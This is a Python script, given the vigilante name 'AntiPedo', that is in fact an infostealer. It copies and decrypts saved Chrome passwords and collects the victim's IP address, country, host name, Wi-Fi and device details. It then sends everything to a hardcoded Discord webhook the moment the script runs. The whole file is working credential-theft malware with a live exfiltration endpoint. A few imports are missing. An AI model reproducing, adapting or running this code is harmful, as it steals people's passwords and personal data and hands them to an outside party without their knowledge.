import os
import shutil
import socket
import sqlite3
import subprocess
import platform
import requests 
class AntiPedo:
    def __init__(self):
        self.ip = ""
        self.level = ""
        self.webhook = "https://discord.com/api/webhooks/1241616753663152138/FgnOYTPzlju5jM2oJe5KvWBddwhr-mUph5K1WlTajI7iAHq4QPDHrHlPO8fV3VwNCKOI"
        
    def get_chrome_passwords(self):
        try:
            data_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data'
            shutil.copy2(data_path, "Loginvault.db")
            conn = sqlite3.connect("Loginvault.db")
        except FileNotFoundError:
            self.passwords = "No passwords"
            return
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        self.passwords = []
        for url, username, password in cursor.fetchall():
            password = win32crypt.CryptUnprotectData(password, None, None, None, 0)[1]
            if password:
                self.passwords.append((url, username, password.decode('utf-8')))
        conn.close()
        os.remove("Loginvault.db")

    def get_ip_address(self):
        r = requests.get("https://api.myip.com")
        
        if not r.ok:
            self.ip="Unable to get IP"

        self.ip = r.json()

    def get_internet_info(self):
        self.host = socket.gethostname()
        self.host_ip = socket.gethostbyname(self.host)

    def get_wifi_level(self):
        try:
            cmd = "iwconfig wlan0 | grep 'Signal level'"
            proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output = proc.communicate()[0].decode("utf-8")
            self.level = int(output.split("level=")[1].split(" ")[0])
        except Exception:
            self.level="There was an error"

    def send_infos(self):
        ip_infos = "IP: "+self.ip["ip"]+"\nCountry: "+self.ip["country"]

        r = requests.post(self.webhook+"?wait=true", json={
            "content": "null",
            "embeds": [
                {
                    "title": "Vulnerable",
                    "color": 5814783,
                    "fields": [
                        {
                            "name": "Passwords",
                            "value": self.passwords
                        },
                        {
                            "name": "IP Address",
                            "value": ip_infos
                        },
                        {
                            "name": "Internet Info",
                            "value": "Host name: "+self.host+"\nHost IP: "+self.host_ip
                        },
                        {
                            "name": "WIFI infos",
                            "value": "Level: "+self.level
                        },
                        {
                            "name": "Device infos",
                            "value": "System: "+self.system+"\nProcessor: "+self.processor+"\nMemory: "+str(self.memory)
                        }
                    ]
                }
            ],
            "attachments": []
        })

        if not r.ok:
            print("Something went wrong!")
            return
        
        print("Everything gone nice:", r.status_code)

    def get_device_info(self):
        try:
            self.system = platform.system()
            self.processor = platform.processor()
            self.memory = psutil.virtual_memory()
        except Exception as e:
            self.system = self.processor = self.memory = "Error"


AntiPedo = AntiPedo()

AntiPedo.get_chrome_passwords()
AntiPedo.get_internet_info()
AntiPedo.get_ip_address()
AntiPedo.get_wifi_level()
AntiPedo.get_device_info()

AntiPedo.send_infos()